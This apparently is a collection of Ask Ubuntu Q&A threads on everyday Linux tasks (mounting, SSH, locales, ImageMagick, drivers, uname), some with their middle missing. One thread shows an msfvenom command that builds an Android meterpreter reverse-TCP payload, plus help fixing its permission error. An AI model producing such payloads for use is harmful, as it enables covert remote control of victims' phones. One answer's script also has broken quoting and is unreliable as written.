["Q: apt-get — Specify source IP address Is it possible to specify the client's IP address (i.e. the source network interface, like eth0, eth0:0, eth0:1...) to which apt-get should bind when it has to connect to the network (for instance installing updates)?\nI didn't find anything in the apt-get man's page.\n\nA: apt-get does not have this functionality, as it really does not (and IMHO should not) care about this.

Is my problem specific to my install or related to IcedTea on 15.10 ?\nAnd... does anyone think of a workaround.\n\nA: Ok, I'm answering my own question: the problem was with the jnlp file format itself, and I had the parsing error I overlooked.\nIt had to do the the format of the href attribute of the jnlp tag containing some question marks (see https://stackoverflow.com/questions/14112318/the-reference-to-entity-subset-must-end-with-the-delimiter)\n", "Q: xubuntu custom read only image I'm using xubuntu mostly with the read-only default image (without installation).\nI was wondering if it's possible to tweak that same exact default xubuntu image and use that newly created image as the default (read only) bootable image.\nObviously, I'm going to assume that I should fully install it first and then tweak it to my own needs and then save it as a custom image but here is the thing...\nI don't want to replicate that image 1:1 to a different hard drive I want to be able to use that same exact tweaked image to be loaded from external bootable USB device (read only) as the same as I loaded the default image from external bootable USB device.\n\nA: A lot depends on what exactly you intend to tweak.\nIf what you want to change is contained in a casper file system embedded in the ISO I don't think you can do this without at least extracting the ISO.  I don't have your specific unnamed Xubuntu ISO so I can only speak in generalities. I would approach this by \n1) Extracting the ISO.\n2) if necessary,  loop mounting the casper file system read/write \n3) tweaking as required\n4) Replacing the changed files in the ISO with isomaster as suggested here.\nNote that you will require at least sufficient storage space to contain both the source and the destination ISO files and if you need to modify the casper filesystem enough space to extract that also and modify it as well.\nSources:\nHow to extract iso images to the hard disk?\nDevice type \"loop\" in mount command\nhttps://stackoverflow.com/questions/2566121/what-is-casper-rw-loop-file-and-why-do-i-need-it-to-make-saving-persistant-on-us/12982030#12982030\nhttps://packages.ubuntu.com/search?keywords=isomaster&searchon=names&suite=all&section=all\nHow to edit ISO Images (Including Bootable ISOs)\n", "Q: Can I run Blueman from Command Line Is it possible to use the command line to connect to a recent connection of the blueman-manager?\nThe applet has the connection I need saved under \"recent connections\".

I used NoMachine to connect to the server. NoMachine usually works fine but last time, NoMachine froze and I had to force close NoMachine. When I restarted the NoMachine and connected back to the server, I found all windows/GUI of my Matlab instances disappeared. They are now running in the background, as I can see them in top, and they are still consuming a fair amount of CPU resources. Plus, I still can observe the data processing output in the output folder I directed Matlab to save the processed data, so I can safely say they are running fine in the background. However, I lost all window/GUI of all Matlab instances.\nIn the image, the top command shows matlabs are still running and consuming a fair amount of CPU resources\nHow can I reclaim these window/GUI? More specifically, I want to restore this window of the matlab instance running in the background.\nThis is the Matlab GUI I want to reclaim\nI can see the PID of Matlab from top. So, does there exist some built-in terminal command like setWindowToFront(PID) that helps me to reclaim the lost windows by PID? Preferably built-in command because I am not privileged to install any package/application on the school server machine.\nps. I can't afford to kill the matlab instance and restart matlab, because the computation takes one month to finish, and I'm just halfway done now.\nps. bg or fg command can't help, they show \"no jobs\"\nps. the windows/GUI can't be in other workspaces because I have just one workspace.\nps. I didn't launch matlab via terminal in the first place. I launched matlab by mouse clicking.\nMany thanks!\n\nA: *\n\n*Get a copy of wmctrl, it is a simple & single command package\napt-get download wmctrl\nmkdir wmctrl_deleteme\ndpkg-deb -X wmctrl_1.07-7_amd64.deb wmctrl_deleteme/\ncd wmctrl_deleteme/usr/bin/\n\nBetter to put it in ~/bin for easy use.\n\n*Check it those windows are managed by WM\n./wmctrl -l\n\n\n*If it they are listed, try this option (man wmctrl)\n   -R <WIN>\n          Move the window <WIN> to the current desktop, raise the window, and give it focus.\n\nEither using window title or id, Examples:\n./wmctrl -R Home\n./wmctrl -i -R 0x02e00238\n\n", "Q: Can I use a Portable Hard Drive instead of a USB stick to install Ubuntu? I left my USB at college and have no DVD's around to burn too. Is it possible to use a portable hard drive in place of the USB to install Ubuntu to my HDD?\n\nA: Yes you can simply load the image onto the hard drive, as you would do it with an USB stick.\nThan boot from the HDD and select install Ubuntu. The wizard will guide you through the installation, where you have to select the correct ! drive. \n", "Q: Using the terminal, how can I see the directory (and files) in an external HDD attached via USB port? Using the terminal, how can I see the directory (and files) in an external HDD attached via USB port?  (I am a beginner so would appreciate simple instructions.  I have tried to find the answer through \"search\" - there are similar questions with answers that I tried to bend to my needs but could not - sorry).\n\nA: Just a small addition to previous answer : \nIf you started on a command line machine, or a headless system (like a rpi for example), device will probably not mount automatically.\nYou then should first search for his device name (sudo fdisk -l) and then mount it in an empty folder (sudo mount /dev/sdb1 /media/myNewlyCreatedFolder)\n\nA: USB media are normally mounted at /media go there in your terminal with cd /media && ls now you should see all storage mounted in that directory. If your device is in the list use cd to change in that directory and use ls or ll to list the files in your hdd.\nIf the hdd is not listed open your file Browser and usectrl+ l to go in the adress bar. There you can see the path of your hdd.\n\nA: The topic that you're looking for is mounting . In the file manager you just click on the button to open it or detach the drive, but behind the scenes it uses udisksctl . Big advantage of this command is that it mounts as your user, and you don't have to specify whole lot of options, unlike the classic mount command.\nFor instance, to mount your usb drive, find device path with either lsblk or sudo blkid and then mount like so, for example,\nudisksctl mount -b /dev/sdb1\n\nOf course remember to replace sdb1 with the actual device name you want to mount.\nOnce the device is mounted successfully, it will be reported where it is mounted. For example, \nskolodya@ubuntu:$ udisksctl mount -b /dev/sdb5\nMounted /dev/sdb5 at /media/xieerqi/0ca7543a-5463-4a07-8bbe-233a7b0bd625.\n\nThen you could navigate to /media/$USER/folder-name and start exploring files and folders\n\nA: sudo mount /dev/sdb1 /media/root lets you mount, but you don't have permission to copy it to another place yet\nTo do that follow https://stackoverflow.com/questions/23520744/cp-failed-to-preserve-ownership-error-when-mounted-manually\nTLDR: mount using this sudo mount -o uid=1000,gid=1000 /dev/sdc1 /mnt/boot and copy using sudo cp -Rrf --preserve=all <source> <destination>\n", "Q: Application is not starting at boot time which should do I have a software named something.jar.

But it doesn't. \nWhere I am doing wrong?\n\nA: What kind of file is /etc/init.d/coc/coc.jar ?\nIt seems to be a java program, which should run via a command line :\njava -jar /Path/to/coc.jar\n\nJar files are normally not executable directly ?\n", "Q: How to work remotely on Ubuntu from another Ubuntu [14.04.3]? I have a machine at home and a second at work. Both run the same version of Ubuntu 14.04.3.\nI want to be able to connect to my home computer from the one at work. I want to see my desktop and work just as if I was sitting at home.\nI want do do it securely so that noone else can access my machine at home.\nI found some threads here relating the subject, but they are all old, so I'm not sure if applicable.\n\nA: You can use VNC which can be installed (server version) on the remote computer.\nMeanwhile, I would recommand you setting an SSH tunnel, since VNC is all but secure !\nTeamviewer also supports Linux. There is a free version, which works great on Ubuntu and Windows computers (both ways !)\n\nA: There's couple of solutions. Ubuntu comes with Remina, remote desktop client, which I've never used, so someone else will cover that. Alternative to that frequently (if not mostly) used for remote connections is ssh.\nLet's say your home computer is going to be server. It will need to have open-ssh installed , so before you can connect , do\nsudo apt-get install openssh-server\n\nYour computer at work will be client. If they were both at home, you would connect to it like so \nssh -X foobar@192.168.0.65\n\nHowever, between your home computer and your work computer there is your home router. That means you have to make your router to politely guide connection from client to your server. Otherwise , the router will be a mean security guard who let's only VIPs into your home network.\nWhat you need to do is have port forwarding set up on the router itself. For the router that means: \"Whenever I, the router will see someone trying connect to me at port 22, I will need to guide it to that specific machine on port 22\". Every router is different, but overview of how to set this up you can find here\nOf course, the big draw back is that you have to know your home IP address. And it's a big draw back because ISP periodically changes IP addresses of the routers. You could sign up for noip DNS service (which is free by the way), which will basically assign a domain to your router and no matter what you will always have that domain point to your router. \nOnce you log into your domain , like ssh -X user@my.domain.blah you will now be able to run startx\n", "Q: xfce does not start (X.Org X server: no screens found) chronos@localhost / $ sudo startxfce4\nEntering /mnt/stateful_partition/crouton/chroots/precise...\n/usr/bin/startxfce4: Starting X server\n\n_XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root\n\nX.Org X Server 1.11.3\nRelease Date: 2011-12-16\nX Protocol Version 11, Revision 0\nBuild Operating System: Linux 2.6.42-61-generic x86_64 Ubuntu\nCurrent Operating System: Linux localhost 3.8.11 #1 SMP Wed Jan 6 20:08:04 PST 2016 x86_64\nKernel command line: cros_secure  console= loglevel=7 init=/sbin/init cros_secure oops=panic panic=-1 root=/dev/dm-0 rootwait ro dm_verity.error_behavior=3 dm_verity.max_bios=-1 dm_verity.dev_wait=1 dm=\"1 vroot none ro 1,0 2506752 verity payload=PARTUUID=a8b78ac0-ef8c-6741-bb17-0295217c31ca/PARTNROFF=1 hashtree=PARTUUID=a8b78ac0-ef8c-6741-bb17-0295217c31ca/PARTNROFF=1 hashstart=2506752 alg=sha1 root_hexdigest=19995d817803b16bfec145455cc381a345919bcd salt=badac15c3bac941e59744e3d2bd1693a45bd3f9ac7daaae970a32aa81be7a25f\" noinitrd vt.global_cursor_default=0 kern_guid=a8b78ac0-ef8c-6741-bb17-0295217c31ca add_efi_memmap boot=local noresume noswap i915.modeset=1 tpm_tis.force=1 tpm_tis.interrupts=0 nmi_watchdog=panic,lapic iTCO_vendor_support.vendorsupport=3  \nBuild Date: 12 February 2015  02:49:01PM\nxorg-server 2:1.11.4-0ubuntu10.17 (For technical support please see http://ww w.ubuntu.com/support) \nCurrent version of pixman: 0.30.2\n        Before reporting problems, check http://wiki.x.org\n        to make sure that you have the latest version.\nMarkers: (--) probed, (**) from config file, (==) default setting,\n        (++) from command line, (!!) notice, (II) informational,\n        (WW) warning, (EE) error, (NI) not implemented, (??) unknown.\n(++) Log file: \"/tmp/Xorg.crouton.1.log\", Time: Fri Jan 22 15:01:37 2016\n(==) Using system config directory \"/usr/share/X11/xorg.conf.d\"\n\nFatal server error:\nno screens found\n\nPlease consult the The X.Org Foundation support \n         at http://wiki.x.org\n for help. \nPlease also check the log file at \"/tmp/Xorg.crouton.1.log\" for additional information.\n\n ddxSigGiveUp: Closing log\nServer terminated with error (1).

I recommend you check this file. Given the filename, I'd expect that to be a backup of an old file, but I'm not entirely sure of that. If I'm right, deleting it might be in order.\n\nA: Have you tried aptitude instead of apt-get ?  \nYou can try \naptitude install linux-image-4.2.0-25-generic\n\nwhich should try to repair this broken package and show you more solutions than apt-get ?\nI've learned that aptitude will be more efficient to provide solutions to dependencies problem (i.e., it will propose you to downgrade a package if needed) than apt-get, which will be more strict on installing dependencies !\n", "Q: I reported a bug on launchpad a while ago and it seems to be fixed now, what should I do? I reported the following bug back when I was still using Ubuntu 14.04 but it hadn't had any activity since.\nI've updated my system since then, and I'm on 15.10 at the moment. And at this point, the bug seems to be fixed in this version.\nI don't have access to a 14.04 installation so I cannot test if it has been fixed there, but I know it is fixed on 15.10.\nSince 14.04 is an LTS release and it is still supported, it doesn't seem right to just mark the bug as \"Fix Released\".\nWhat should I do in this case?\nShould I just wait till the maintainer closes it? can I close it myself just for 15.10 and keep it open for 14.04?\nFor now, I left a comment on the bug asking the same. But I'd like to know what is the usual course of action in this case.\n\nA: If you can't test it on Ubuntu 14.04, just leave it as it is.\nSomebody will probably test it and report.\n", "Q: Permission denied when using bundler commands I am pretty much completely new to Metasploit so I may just be having a problem that anyone who is experienced could fix but I hadn't seen any fixes online anywhere.  I am running \nmsfvenom -p android/meterpreter/reverse_tcp LHOST=ip R > filename.apk\n\nand get returned \nbash: filename.apk: Permission denied\n\nAlso to even run this command without getting piles of errors or to run the metasploit console I have to be in /opt/metasploit-framework.  \nAnyways, I have only found one source with the same problem, Getting 'Permission Denied' when running bundler command, however, there is no solution here either.  \nHas anyone else encountered this problem and found a solution?\n\nA: If you run\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=ip R > filename.apk \n\nfrom a location you do not own creating the file filename.apk will result in a Permission denied. That is a well know security measure in Linux. In that case you need \"sudo\" in front of the command.\n\nAlso to even run this command without getting piles of errors or to run the metasploit console I have to be in /opt/metasploit-framework/\n\nMeans you probably own that directory and anything in it or parameters that are expected can be found from /opt/metasploit-framework/ and not from another directory (that will ne related to the PATH variable or setting the environment variables). Impossible to further answer unless you edit the messages into your question. \n", "Q: Where can I locate legacy hashes for older minor releases?

Although topics that I found were sometimes similar/related they did not solve my specific problem in the end.\nI started out with a notebook that had Windows preinstalled and I installed Ubuntu 15.10 on a separate partition additionally. After that, Ubuntu started up within 20 - 30 seconds... or at least quick enough for me to assume it's a boot at suitable pace.\nThen I made another partition and installed a Debian distro. After that, the Ubuntu boot became painfully slow, like 5 minutes or so. I managed to enable verbose boot, so I could see what the system is taking so long with.\nThere appears to be two times when the system hangs during the boot. Once is when the verbose output reaches something that has to do with Bluetooth,  but the second and more significant hang apparently happens during the time something is done to the swap.\nThe attached image shows where the system hangs during boot. The code is the output from systemd-analyze critical-chain .\n\ngraphical.target @1min 34.575s\n└─multi-user.target @1min 34.575s\n  └─getty.target @1min 34.575s\n    └─getty@tty1.service @1min 34.575s\n      └─rc-local.service @1min 31.748s +199ms\n        └─network-online.target @1min 31.746s\n          └─network.target @1min 31.745s\n            └─wpa_supplicant.service @1min 31.954s +62ms\n              └─basic.target @1min 31.545s\n                └─sockets.target @1min 31.545s\n                  └─uuidd.socket @1min 31.544s\n                    └─sysinit.target @1min 31.532s\n                      └─systemd-rfkill@rfkill0.service @22.681s +3ms\n                        └─system-systemd\\x2drfkill.slice @3.393s\n                          └─system.slice @1.295s\n                            └─-.slice @1.294s\n\nMy system:\n\n*\n\n*Intel Core i5\n\n*12GB RAM\n\n*1TB HDD\n\n*NVIDIA GeForce 840M\n\n\nA: I think that the additional partition with the Debian installation is not related to the slowdown. The most likely causes are: corruption of your Ubuntu installation, or bad system updates. The easiest solution is to avoid debugging things at this point. As you haven't invested many hours in configuring your Ubuntu install, I recommend just formatting over and then reinstalling Ubuntu. Also, just to rule out Windows interference, it's currently best to change partitions from within Windows. \n", "Q: How to open something cmd like?

Any one knows?\nPlease help me. \n\nA: You are looking for terminal  - you can either type the name terminal into the search, or press ctrl+alt+t\n\nA: This is very easy. The command line in Ubuntu is called Terminal. Search for Terminal in the Dash (at the top right) or press  Ctrl + Alt + T.\n", "Q: Auto unlock keyring on auto login without leaving password unencrypted So I keep getting this unlock keyring popup when I login to Ubuntu automatically. There is a fix here: How can I stop being prompted to unlock the 'default' keyring on boot?\nI have been googling around for about an hour and the solution to this problem seems to always be the same: disregard security entirely by leaving the password blank OR turn off auto login.\nI would really like to find a way to use the auto login feature AND avoid seeing this popup without leaving passwords unencrypted. \nIs it possible to get this bug fixed upstream so that users wouldn't have to fight with this auto login defeating popup?\nThank you in advance!\n\nA: There is no way to have a keyring password enabled, use auto login and disable the poppup. This is made by design.\nThe password should be entered some way. If you enable auto login, then you do not enter a password.\nIf anyone can start the system without entering any password, what is the reason to have a keyring password enabled?\nYour suggestion does not make any sense at all. And it is not a bug. Thus it won't be fixed.\n\nA: Although your question is very legitimate, you are asking something that is literally impossible.\nYou need a key to encrypt and decrypt something. When you use a login, the login password is used as a key to encrypt and decrypt the keyring. When you don't use a login, there is nothing to encrypt the keyring with. The only option is that the OS stores the key on your computer. Locking a safe and leaving the key in the keyhole is useless.  That is what your computer would be doing if it encrypts the keyring and stores the password.\n\nA: *\n\n*Go Ubuntu Apps > \"Password and Keyring\"\n\n*Right-click on \"Login\" > \"Change Password\"\n\n*Use your same old password.\n\nHere is the source with pictures on Unity,\nGnome is not different, same process\n\nA: I used to get these \"Default Keyrings\" popups whenever I used to click on Chrome browser. This happens when you change your system/user password. This solution has worked for me so please let me know if this was of any help for you. Just go through the steps given below.\nGo to Files > \"Press Ctrl+H\" > .local > share > keyrings.\nThere will be 2 files in keyrings folder. Only delete \"login.keyring\" and then restart the system.\nWhen you enter your User ID and password, your keyrings password will also get updated automatically and the pop up will also stop.\nDon't worry about deleting the \"login.keyring\" file as it will be generated again automatically when you login your system.\n", "Q: Cannot login after running startx and rebooting Yesterday I tested startx, and in user root(admin) I went to x-window system.\nAfter this I shutdown Linux by power off virtual machine vmware button.

I assume you have a 64-bit system.\nCopy iscan-bundle-1.0.0.x64.deb.tar.gz to your home folder.\nRun in terminal:\ntar xaf iscan-bundle-1.0.0.x64.deb.tar.gz\ncd iscan-bundle-1.0.0.x64.deb\nsudo ./install.sh\n\nTry to scan with \"Simple Scan\".\n\nA: I was looking for a driver of the Scanner Modell Epson Styus DX3850. The installation routine does not differ between printers and scanners, therefore this instruction works as well for printers.\nThe following procedure describes the scanner driver installation on Ubuntu 16.10: \n1. Access Epsons' Website and find the driver for the specific device, in my case the Scanner Epson Stylus DX3850. Choose the the driver for the corresponding OS, Linux 32/64 Bit. \nhttp://download.ebz.epson.net/dsc/search/01/search/searchModule\n2. Switch to folder where the driver was downloaded. Extract the archive and run install.sh inside the archive folder:\n\ncd ~/Downloads/iscan-bundle-1.0.4.x86.deb \ntar xaf iscan-bundle-1.0.4.x86.deb.tar.gz\ncd iscan-bundle-1.0.4.x86.deb\n./install.sh\n\nAfterwards, three folders are present inside the main driver folder, named:\nplugins, data, core. Each folder contains a separate package, that has to be installed. \nThe packages has to be installed in the following order:\n\n\n*\n\n*A: Data\n\n*B: Core\n\n*C: Plugins\n\n\n3. Install the packages:\nChange in terminal to each package folder and install them in the following order by following commands:\nData Package:\n\ncd ~/Downloads/iscan-bundle-1.0.4.x86.deb/data\nsudo dpkg --install iscan-data_1.39.0-1_all.deb\n\nCore Package:\n\ncd ~/Downloads/iscan-bundle-1.0.4.x86.deb/core\nsudo dpkg --install iscan_2.30.3-1_i386.deb\n\nPlugins Package:\n\ncd ~/Downloads/iscan-bundle-1.0.4.x86.deb/plugins\nsudo dpkg --install iscan-network-nt_1.1.1-1_i386.deb\n\nFinally, the Scanner application can be found in the computers dash under the name Simple Scan. \nObservation: The Scanner itself is not listed as a device in the system settings, as in the printers case.\nGreets \nTom \n\nA: I tried doing this but still the scanner is not working. Now simple scan recognizes the scanner as \"unknown model\", but does not scann. Other programs such as Image Scan! for Linux and gscan2pdf say the device is busy.\nDo you know how to fix that?\n", "Q: Possibly something wrong with my terminal Whenever I open my terminal I get something like this:\n alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] && echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&|]\\s*alert$//'\\'')\"'\n    alias egrep='egrep --color=auto'\n    alias fgrep='fgrep --color=auto'\n    alias grep='grep --color=auto'\n    alias l='ls -CF'\n    alias la='ls -A'\n    alias ll='ls -alF'\n    alias ls='ls --color=auto'\n\nI'm not sure what this is or what it means I'm new to Linux.

(For more info about it, type man alias; alias is explained under \"Bash Builtin Commands\").\nIt means that somewhere in your .bashrc file you have this line:\nalias\n\nRemove it and you'll be good to go.\n", "Q: Logging script output to a file I wrote a simple script to monitor my gpu clocks and temps. I wanted it to, aside from being visible on the terminal, log its output on an external file. How could I achieve this? My script below, for reference:\n#!/bin/bash\n\nwatch -n 1 \"amdconfig --odgc\" \"amdconfig --odgt\"\n\nThe question is not a duplicate because I'm using the \"watch\" command.\n\nA: You really don't want to do that. watch is designed to be, um, watched. Its output is formatted in such a way as to make redirecting it impractical. While you can actually do it using something like tee, the output will be many blank lines and very little useful information.\nSo, in the specific case of watch, you're better off writing your own little script that does the same thing:\n#!/bin/bash\n    \n## This is an infinite loop, the script will run until you kill it\nwhile :; do\n  ## Run the command whose output you want to monitor\n  amdconfig --odgc\" \"amdconfig --odgt\n\n  ## Wait for 2 seconds. This mimics what the watch command does\n  ## and also avoids spamming your cpu. \n  sleep 2\ndone\n\nSave that script as ~/bin/amdwatch or whatever you like, make it executable (chmod +x ~/bin/amdwatch) and then redirect its output to a file:\n~/bin/amdwatch > amdwatch.log \n\nThat will run the script until you stop it manually and execute the amdwatch command every two seconds, saving its output to amdwatch.log.\nFor most scripts, what you are looking for is script.sh > outputFile.txt or script.sh >> outputFile.txt. See How do I save terminal output to a file?.\n\nA: watch will by default clear the screen each time it prints to stdout. So I would suggest you use a while loop with a delay. Then you could use script  command or tee to log the output. For instance,\nwhile [ 1 ]; do df ; sleep 0.25; done | tee -a MY_FILE\n\nIt both will be displayed on the screen and will go to file, appending each run of the command\n", "Q: Installed headers don't exist according to GCC I want to compile Pike with the GTK library.

Why can't gcc find them?\n\nA: You haven't told g++ where to find them: by default, it only looks in the top-level /usr/include directory, whereas the headers you are trying to include are in a gtk-2.0 subdirectory.\nYou can either add the include path manually e.g.\ngcc -I /usr/include/gtk-2.0 test.c\n\nor (the recommended way) use pkg-config to pull the required paths and flags directly from the package's supplied .pc file\ngcc `pkg-config --cflags gtk+-2.0` test.c\n\nIf you actually use any symbols from the included library, you will likely need to do the same for the linker path e.g.\ngcc test.c `pkg-config --cflags --libs gtk+-2.0` \n\nSee for example Compiling GTK+ Applications on UNIX from the GNOME Developer Center\n", "Q: How to set LC_NUMERIC to English permanently? I need to change LC_NUMERIC to English (I have Ubuntu in Spanish) because of the dots and the commas, but if I use LC_NUMERIC=\"en_US.UTF-8\" when I exit the terminal and I open it again, LC_NUMERICis again in Spanish.\nDoes anyone know how to solve this? \n\nA: The \"official\" technique to change locale settings for number formatting system-wide is:\nsudo update-locale LC_NUMERIC=en_US.UTF-8\n\nAfter that, restart your system.\nIf it still does not work, then probably your graphical desktop environment overwrites the system-wide locale settings. On a personal computer, it is best to configure it so that it does not modify the system-wide locale settings at all. How to do this depends on the desktop environment you use. I made instructions for LXQt for this.\nSource: A comment by Ron above. I wanted to turn it into a proper answer as it's the official and most straight-forward technique.\n\nA: Append the value to your ~/.bashrc file:\necho 'export LC_NUMERIC=\"en_US.UTF-8\"' >>~/.bashrc\n\nTo make it applicable from the current session of bash, source the ~/.bashrc file:\nsource ~/.bashrc\n\nExample: Here i am changing from en_US.UTF-8 to C:\n$ locale | grep LC_NUMERIC\nLC_NUMERIC=\"en_US.UTF-8\"\n\n$ echo 'export LC_NUMERIC=\"C\"' >>~/.bashrc\n\n$ source ~/.bashrc \n\n$ locale | grep LC_NUMERIC\nLC_NUMERIC=C\n\nThis will change the locale for only the user running the command, for system wide change you need to add the value to /etc/default/locale, check the added portion below.\n\nYou can also add the value to the systmwide locale file, /etc/default/locale, which will be read at start. To put it there:\necho 'LC_NUMERIC=\"en_US.UTF-8\"' | sudo tee -a /etc/default/locale\n\nOr\nsudo bash -c 'echo \"LC_NUMERIC=\\\"en_US.UTF-8\\\"\" >>/etc/default/locale'\n\n\nA: Graphical logins do not read shell startup files ( ~/.bashrc,  ~/.profile and so on ) by default and also should not because these are bash specific.\nSo it is better to use /etc/environment for system wide environment settings and ~/.xsessionrc for user specific settings.\nPAM should by default read /etc/environment - check that \n/etc/pam.d/login /etc/pam.d/sshd /etc/pam.d/su /etc/pam.d/cron\n\nincludes the line\nsession       required   pam_env.so readenv=1\n\n-> https://wiki.debian.org/EnvironmentVariables\n", "Q: Why does the Openstack Autopilot require two disks on each node? For OpenStack Autopilot, it was mentioned that \n\nYou’ll need at least five machines with two disks in each, two of\n  which have two network interfaces (NICs)\n\nSo my question is MUST I have two disks on the servers? \nIf yes then why?\nAlso do all machines have to be identical? like have same CPU model, same disks model, same RAM amount?\nAlso can I have certain machines for storage, certain machines for compute and et cetera?\n\nA: Why does Ceph require two disks?\nIn the words of Mark Shuttleworth:\n\nCeph wants to keep track of the whole\n  disk, literally, with the ability to format it and determine labels etc.\n  This is so you can rip the disk out of one machine, stick it in another,\n  and Ceph will see it, remember it, find all the data on it, as if\n  nothing had changed.\n\nsource\nIs it possible to do it on one disk?\nCeph can be configured to use a directory as opposed to the whole drive. However this is not recommended and, for that reason, not supported in autopilot.\nThanks to 0xF2 for the explanation.\n\nA: Yes you must.\nThe architecture that Autopilot 15.11 uses to deploy OpenStack is fully converged.

I have tested this with smaller images and it works fine. I would have thought 1G if memory would be plenty to manage a resize, but perhaps not?\nWhat are my options, do I have to get more memory or am I missing something?\nAny suggestions are very welcome!\nRequested Edits\nstrace output shows: +++ killed by SIGKILL +++ along with alot of commands that look normal (opening /usr/share/local and reading long strings, which I assume is image data)\nfree gives me:\n         total       used       free     shared    buffers     cached\nMem:       1016292     278348     737944       6412        460      13356\n-/+ buffers/cache:     264532     751760\nSwap:            0          0          0\n\nSo it looks as if swap is not enabled, so I will look into creating a swapfile to see if this sorts my issues.\nFile gives me:\ntestprint10Mbv2.jpg: JPEG image data, EXIF standard\n\nI would also paste the full /path/to/img but unfortunately it contains sensitive data (client email addresses etc)\n\nA: I'm assuming you are running out of RAM. You can verify this with watch cat /proc/meminfo while your process is running. \nYou may have insufficient RAM and/or SWAP to accomplish your task. \nDue to the low-ram condition, insure that swap is on with swapon -a and if no swap is setup on the system create a partition for swap on unused diskspace and enable it. This will likely solve the problem. There's a good answer by @Takkat on how to do that here If you don't have access to partitioning the server you can also use a swapfile for swap \n\nA: The issue in the question was resolved by adding appropriate swap. For completeness let me give a summary of additional options we have when running Image Magick convert on huge files on low memory systems, or when there is no swap available, or the swap was too small.\nThe methods mentioned below are elaborated in detail in the Image Magick manual:\nReally Massive Image Handling\n\nSummary:\n\n\n*\n\n*Limit memory usage with option -limit\nBy doing so Image Magick will create a temporary file for image handling as soon as the given memory limits were exceeded. This needs write permission for Image Magick on the temporary file directory. We can give any path where the temporary file will be created in an environment variable MAGICK_TMPDIR. An example command may look similar to this:\n    env MAGICK_TMPDIR=/tempdir nice -5 convert -limit memory 32 -limit map 32 largefile.jpg -resize 640x320 smallfile.png\n\nWorking on disk rather than in RAM will slow down the processing speed considerably.\n\n*Work with \"Memory Mapped Disk Files\"\nCreating MPC files is resource demanding but it does not need so much resources to convert from MPC files. Therefore is may be put into consideration in case we need to convert the same source with different parameters several times. The workflow may then be similar to this:\nconvert huge.jpg huge.mpc\nconvert huge.mpc -resize 50% big.png\nconvert huge.mpc -resize 20% small.png\nconvert huge.mpc -resize 5% thumb.png\n\n\n*Work on small sections of an image using stream\nUsing stream claims to only process a part of the source image without the need to load the whole image into memory.\nstream -map rgb -storage-type char -extract 600x400+1900+2900 image.png - | convert -depth 8 -size 600x400 rgb:- tile.png\n\nIn above example the -extract option takes size and offset values as defined by the Image Magick geometry. We will have to stick the tiles back together for getting the scaled image as a whole. Unfortunately stream does not work for all image formats but is supposed to work fine on JPEG images.\n", "Q: Whats the best way to install drivers? I'm pretty new to Ubuntu, been using it for about a week (I love it). Can someone tell me what the best way to install video drivers is? I've been having some troubles. I have a GeForce 750ti and am on 14.04.

It should look something like this:\n\nOnce you've found the driver and clicked on it, just press the apply changes button and enter your password. You will probably need to restart before the new driver takes effect.\nIf you don't see the driver you want listed then you may need to allow more software sources.

What's the issue here?\n\nA: When you login as su - your environment changes, you are now root and current working directory is /root\nskolodya@ubuntu:$ su -                                                         \nPassword: \n$ pwd\n/root\n\nWhat you need to do is mv /home/$USER/eclipse /opt . Note: change \n$USER to your actual user name\nSide note: When you run as root you dont need sudo. As regular user , without login in to su - you could just do sudo mv ~/Documents/eclipse /opt and that would do it, because your environment with sudo wouldn't change\n\nA: Serg gave the right answer but I'd just like to add that Eclipse is available in the Ubuntu software centre, which will allow you to get automatic updates, unlike downloading the source.\nTo get Eclipse installed easily, just search for it in the Software Centre (or search for eclipse-platform), or use sudo apt install eclipse*.\n", "Q: Windows boots instead of grub help, I just installed linux but when I reboot, windows 10 starts instead of grub.\nI try to selected a diffrent boot by pressing esc, but I could only chooice windows boot system, of my cd/dvd player.\nsecure boot is disabled (the answer of Windows boots instead of asking which OS to boot) \nI am prety new to linux, So I hope somebody can help me with this?\nIt was already hard to install linux at the first place.\nThanks a lot!\n\nA: Either you installed grub somewhere where your escape menu can't find it, or grub wasn't properly installed. Explore a bit in you BIOS boot settings, or try reinstalling linux and looking for grub options. Grub should be installed on your windows drive.\n\nA: Sounds like grub is missing. Do something like this: \nhttp://howtoubuntu.org/how-to-repair-restore-reinstall-grub-2-with-a-ubuntu-live-cd\nOr reinstall, and make sure you install grub on /dev/sda (assuming your drive is called sda, just DON'T install it on /dev/sda1 or something.\nLook at the picture here: https://help.ubuntu.com/community/Grub2/Installing\n", "Q: Where is \"uname\" pulling information from? Where is uname -i pulling the information from?\nDo the details exist in /etc/? \nDo the details exist in /proc/?\nIf so, which file is it referencing to output those details?\n\nA: Of course heemayl's answer is correct.\nJust for fun, here's a working C snippet showcasing the data returned by uname() (a sort of a homemade uname if you want): compile it with gcc uname.c -o uname and run it with ./uname:\n#include <stdio.h> // printf()\n#include <sys/utsname.h> // uname()\n\nint main() {\n        int ret; // stores the return value of uname()\n        struct utsname utsname; // stores the data returned by uname()\n        struct utsname *utsname_ptr = &utsname; // pointer to the struct holding the data returned by uname()\n\n        ret = uname(utsname_ptr); // calls uname() on utsname_ptr and stores its return value in ret\n\n        /* prints the fields of utsname */\n\n        printf(\"%s\\n\", utsname.sysname);\n        printf(\"%s\\n\", utsname.nodename);\n        printf(\"%s\\n\", utsname.release);\n        printf(\"%s\\n\", utsname.version);\n        printf(\"%s\\n\", utsname.machine);\n\n        /* returns the return value of uname() */\n\n        return(ret);\n}\n\n% ./uname \nLinux\nuser-X550CL\n4.2.0-25-generic\n#30-Ubuntu SMP Mon Jan 18 12:31:50 UTC 2016\nx86_64\n\n\nA: As an addition to heemayl's answer, you can get some information like in the uname command from /proc/version.\n\nA: uname uses the system call uname(2) to get the kernel related information it shows.\nThe synopsis is:\n#include <sys/utsname.h>\nint uname(struct utsname *buf);\n\nwhere uname(2) returns information in the structure pointed to by buf. Also you can read the header file utsname.h from /usr/include/\"$(arch)\"-linux-gnu/sys/utsname.h to dig deeper.\nHave a look at man 2 uname to get more idea about this.\n\nA: The program strace allows us to view the system calls an application may make. With uname -a it's apparent that the only open calls go to system libraries, so technically there is no file on the filesystem that the uname opens for reading. Rather it makes system calls using the C libraries.\nAs heemayl properly pointed out there exists sys call to retrieving  the information stored in the uname structure. It's man page, suggests the following: \n\nThis is a system call, and the operating system  presumably knows  its\n         name,  release  and  version . . .\n   . . .  Part of the utsname information is also accessible  via  /proc/sys/ker‐\n         nel/{ostype, hostname, osrelease, version, 